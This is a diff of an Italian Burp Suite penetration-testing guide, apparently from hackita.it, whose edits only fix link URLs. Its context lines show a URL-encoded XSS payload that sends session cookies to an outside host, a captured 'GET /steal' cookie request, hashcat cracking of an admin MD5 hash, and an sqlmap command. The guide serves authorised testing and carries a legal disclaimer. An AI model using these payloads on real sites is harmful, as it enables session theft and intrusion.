@@ -22,7 +22,7 @@ featured: true
 
 Burp Suite è lo strumento indispensabile per penetration testing di applicazioni web. Sviluppato da PortSwigger, Burp Suite è l'intercepting proxy più usato al mondo dai security researcher per trovare vulnerabilità in web app moderne.
 
-Quando devi testare autenticazione, scoprire [SQL injection](https://hackita.it/articoli/sqlmap), identificare [XSS](https://hackita.it/articoli/xss), manipolare sessioni o analizzare API, Burp Suite è il tuo laboratorio completo. In questa guida impari a usare Burp Suite come un professionista: da configurazione base a exploitation avanzata con tecniche reali di penetration testing.
+Quando devi testare autenticazione, scoprire [SQL injection](https://hackita.it/articoli/sqlmap/), identificare [XSS](https://hackita.it/articoli/xss/), manipolare sessioni o analizzare API, Burp Suite è il tuo laboratorio completo. In questa guida impari a usare Burp Suite come un professionista: da configurazione base a exploitation avanzata con tecniche reali di penetration testing.
 
 ## Cos'è Burp Suite e Perché Usarlo
 
@@ -410,9 +410,9 @@ Active scan invia payloads per testare vulnerabilità.
 
 **Vulnerabilità testate:**
 
-* [SQL Injection](https://hackita.it/articoli/sqlmap)
-* [XSS](https://hackita.it/articoli/xss) (reflected, stored, DOM)
-* [CSRF](https://hackita.it/articoli/csrf)
+* [SQL Injection](https://hackita.it/articoli/sqlmap/)
+* [XSS](https://hackita.it/articoli/xss/) (reflected, stored, DOM)
+* [CSRF](https://hackita.it/articoli/csrf/)
 * XXE (XML External Entity)
 * SSRF (Server-Side Request Forgery)
 * Path traversal
@@ -572,7 +572,7 @@ username: admin
 password: 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)
 ```
 
-**Step 5: Cracka hash con [Hashcat](https://hackita.it/articoli/hashcat)**
+**Step 5: Cracka hash con [Hashcat](https://hackita.it/articoli/hashcat/)**
 
 ```bash
 echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
@@ -583,7 +583,7 @@ hashcat -m 0 hash.txt rockyou.txt
 
 **Step 6: Login con admin:password**
 
-Per exploitation automatica usa [SQLMap](https://hackita.it/articoli/sqlmap) con request file da Burp.
+Per exploitation automatica usa [SQLMap](https://hackita.it/articoli/sqlmap/) con request file da Burp.
 
 ### Scenario 2: XSS Discovery e Weaponization
 
@@ -630,7 +630,7 @@ https://target.com/search?q=%3Cimg+src%3Dx+onerror%3Dfetch%28%27https%3A%2F%2Fat
 GET /steal?c=session=abc123xyz456
 ```
 
-Vedi [XSS Advanced](https://hackita.it/articoli/xss) per payloads completi.
+Vedi [XSS Advanced](https://hackita.it/articoli/xss/) per payloads completi.
 
 ### Scenario 3: CSRF Token Bypass
 
@@ -719,7 +719,7 @@ X-HTTP-Method-Override: GET
 Response: 200 OK, lista users senza auth!
 → Vulnerable!
 
-Vedi [API Hacking](https://hackita.it/articoli/api-hacking) per tecniche complete.
+Vedi [API Hacking](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/) per tecniche complete.
 
 ### Scenario 5: Session Fixation Attack
 
@@ -954,7 +954,7 @@ Right-click → Save item → request.txt
 sqlmap -r request.txt --batch --level 3 --risk 2
 ```
 
-Vedi [ffuf Guide](https://hackita.it/articoli/ffuf) per directory fuzzing integration.
+Vedi [ffuf Guide](https://hackita.it/articoli/ffuf/) per directory fuzzing integration.
 
 ## Tabella Vulnerabilità vs Burp Tool
 
@@ -987,7 +987,7 @@ Sì, assolutamente. Community ha Proxy, Repeater, Intruder (limitato) ed Extende
 Intruder Community è throttled intenzionalmente. Alternative:
 
 * Turbo Intruder extension (veloce, richiede Python scripting)
-* [ffuf](https://hackita.it/articoli/ffuf) per fuzzing veloce esterno
+* [ffuf](https://hackita.it/articoli/ffuf/) per fuzzing veloce esterno
 * Passa a Burp Professional
 
 **Burp può testare mobile app?**
@@ -1028,7 +1028,7 @@ Sì. Burp intercetta GraphQL queries normalmente. Extension consigliate:
 * InQL Scanner (GraphQL introspection)
 * GraphQL Raider
 
-Vedi [GraphQL Security](https://hackita.it/articoli/graphql-security) per tecniche specifiche.
+Vedi [GraphQL Security](https://hackita.it/articoli/graphql-exploitation/) per tecniche specifiche.
 
 **Come gestire rate limiting durante Intruder?**
 
@@ -1060,8 +1060,8 @@ Se questa guida ti è stata utile, considera di supportare HackIta:
 
 * [Burp Suite Documentation](https://portswigger.net/burp/documentation)
 * [PortSwigger Web Security Academy](https://portswigger.net/web-security) (training gratuito)
-* [SQLMap Integration](https://hackita.it/articoli/sqlmap)
-* [XSS Exploitation](https://hackita.it/articoli/xss)
-* [ffuf Web Fuzzing](https://hackita.it/articoli/ffuf)
+* [SQLMap Integration](https://hackita.it/articoli/sqlmap/)
+* [XSS Exploitation](https://hackita.it/articoli/xss/)
+* [ffuf Web Fuzzing](https://hackita.it/articoli/ffuf/)
 
 **Disclaimer Legale:** Burp Suite è tool legale per security testing autorizzato. L'utilizzo su applicazioni web senza esplicito consenso scritto del proprietario costituisce reato penale (accesso abusivo a sistema informatico, art. 615-ter c.p.). Usa solo su sistemi di tua proprietà o in contesto di penetration test formalmente autorizzato con scope e regole di engagement definite.
